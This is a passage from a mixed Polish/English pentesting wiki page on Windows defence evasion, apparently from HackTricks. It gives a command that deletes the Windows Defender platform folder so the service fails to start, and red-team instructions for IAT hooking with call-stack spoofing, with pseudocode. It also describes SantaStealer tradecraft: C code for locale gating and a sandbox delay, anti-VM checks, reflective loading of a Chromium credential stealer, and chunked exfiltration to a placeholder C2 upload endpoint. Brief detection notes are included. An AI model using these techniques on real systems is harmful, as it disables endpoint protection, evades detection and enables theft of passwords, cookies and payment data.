- Service kill/denial: Usuń version-symlink, tak aby przy następnym uruchomieniu skonfigurowana ścieżka nie została rozwiązana i Defender nie uruchomił się:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Zauważ, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga praw administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams mogą przenieść unikanie wykrycia w czasie wykonywania z implantu C2 do samego modułu docelowego, hookując jego Import Address Table (IAT) i kierując wybrane API przez kontrolowany przez atakującego, position‑independent code (PIC). To uogólnia mechanizmy unikania wykrycia poza wąski zbiór API, które udostępniają wiele kitów (np. CreateProcessA), i rozszerza te same zabezpieczenia na BOFs i post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimalny szkic IAT hook (x64 C/C++ pseudokod)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notatki
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Utrzymuj wrappery małe i PIC‑safe; rozwiąż prawdziwe API przez oryginalną wartość IAT, którą uchwyciłeś przed patchowaniem, lub przez LdrGetProcedureAddress.
- Używaj przejść RW → RX dla PIC i unikaj pozostawiania writable+executable stron.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- To omija wykrycia, które oczekują kanonicznych stosów z Beacon/BOFs przy wywołaniach wrażliwych API.
- Łącz z technikami stack cutting/stack stitching, aby wylądować wewnątrz oczekiwanych frame'ów przed prologiem API.

Integracja operacyjna
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Użyj Aggressor script do zarejestrowania docelowych API, tak by Beacon i BOFs transparentnie korzystały z tej samej ścieżki unikania bez zmian w kodzie.

Uwagi dotyczące wykrywania/DFIR
- IAT integrity: wpisy, które rozwiązują się do non‑image (heap/anon) adresów; okresowa weryfikacja wskaźników importu.
- Stack anomalies: adresy powrotu nie należące do załadowanych obrazów; nagłe przejścia do non‑image PIC; niespójne pochodzenie RtlUserThreadStart.
- Loader telemetry: zapisy w procesie do IAT, wczesna aktywność DllMain modyfikująca import thunki, niespodziewane RX regiony tworzone przy ładowaniu.
- Image‑load evasion: przy hookowaniu LoadLibrary* monitoruj podejrzane ładowania automation/clr assemblies skorelowane z wydarzeniami memory masking.

Powiązane elementy i przykłady
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ilustruje, jak nowoczesne info‑stealers łączą AV bypass, anti‑analysis i dostęp do poświadczeń w jednym workflow.

### Keyboard layout gating & sandbox delay

- Flaga konfiguracji (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. Jeśli wykryty zostanie układ cyrylicki, próbka upuszcza pusty marker `CIS` i kończy działanie przed uruchomieniem stealers, zapewniając, że nigdy nie detonuje na wykluczonych lokalizacjach, pozostawiając jednocześnie artefakt przydatny dla threat‑huntingu.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Warstwowa logika `check_antivm`

- Variant A przegląda listę procesów, hashuje każdą nazwę przy użyciu niestandardowego rolling checksum i porównuje ją z osadzonymi blocklists dla debuggers/sandboxes; powtarza checksum dla nazwy komputera i sprawdza katalogi robocze takie jak `C:\analysis`.
- Variant B bada właściwości systemu (minimalna liczba procesów, ostatni uptime), wywołuje `OpenServiceA("VBoxGuest")` aby wykryć VirtualBox additions i wykonuje timing checks wokół sleepów, by wychwycić single-stepping. Każde trafienie powoduje abort przed uruchomieniem modułów.

### Fileless helper + double ChaCha20 reflective loading

- Główny DLL/EXE osadza Chromium credential helper, który jest albo zapisany na dysk, albo mapowany ręcznie w pamięci; fileless mode rozwiązuje imports/relocations samodzielnie, więc żadne helper artifacts nie są zapisywane.
- Ten helper przechowuje drugostopniowy DLL zaszyfrowany dwukrotnie ChaCha20 (dwa 32‑bajtowe klucze + 12‑bajtowe nonces). Po obu przebiegach reflectively loads blob (no `LoadLibrary`) i wywołuje eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` pochodzące z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Routines ChromElevator używają direct-syscall reflective process hollowing, aby wstrzyknąć się do działającej przeglądarki Chromium, odziedziczyć AppBound Encryption keys i odszyfrować passwords/cookies/credit cards bezpośrednio z baz SQLite pomimo ABE hardening.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` iteruje globalną tabelę wskaźników funkcji `memory_generators` i uruchamia po jednym wątku na włączony moduł (Telegram, Discord, Steam, screenshots, documents, browser extensions, itd.). Każdy wątek zapisuje wyniki do współdzielonych buforów i raportuje liczbę plików po ~45s oknie join.
- Gdy skończone, wszystko jest spakowane za pomocą statycznie linked `miniz` jako `%TEMP%\\Log.zip`. `ThreadPayload1` potem sleepuje 15s i streamuje archiwum w chunkach po 10 MB przez HTTP POST do `http://<C2>:6767/upload`, podszywając się pod boundary przeglądarki `multipart/form-data` (`----WebKitFormBoundary***`). Każdy chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opcjonalne `w: <campaign_tag>`, a ostatni chunk dopisuje `complete: true`, żeby C2 wiedział, że reassembly jest zakończone.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
